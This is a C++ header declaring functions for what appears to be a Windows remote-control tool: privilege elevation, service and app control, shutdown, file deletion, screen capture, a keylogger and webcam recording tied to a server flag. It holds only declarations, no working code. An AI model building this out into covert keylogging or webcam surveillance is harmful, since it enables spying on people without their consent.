#pragma once
#ifndef WINDOWAPI_H
#define WINDOWAPI_H
#include "Header.h"

bool IsRunningAsAdmin();
void RelaunchAsAdmin();
vector<std::pair<std::wstring, std::wstring>> ListServices();
bool StartServiceByName(const wstring& serviceName);
bool StopServiceByName(const wstring& serviceName);
std::wstring stringToWString(const std::string& str);
std::string wstringToString(const std::wstring& wstr);
std::string GetShortcutTarget(const std::string& shortcutPath);
std::vector<std::pair<std::string, std::string>> FindShortcutsInDirectory(const std::string& directory);
std::vector<std::pair<std::string, std::string>> ListApplications();
bool StartApp(const std::string& appPath);
bool StopApp(const std::string& appPath);
int ShutdownSystem();
int ResetSystem();
string TranslateKey(int key, bool capsLock, bool shiftPressed, bool winPressed);
void Keylogger(bool& isTurnOn, bool& appOn);
bool DeleteFile(const string& filepath);
bool CaptureScreen();
struct WebcamController {
	cv::VideoCapture capture;
	cv::VideoWriter writer;
	bool isRecording = false;

	void startWebcam();
	void stopWebcam();
	void recordWebcam();
};
void Webcam(bool& isWebcamOn, bool& isServerOn);
extern WebcamController webcam;
#endif // !WINDOWAPI_H
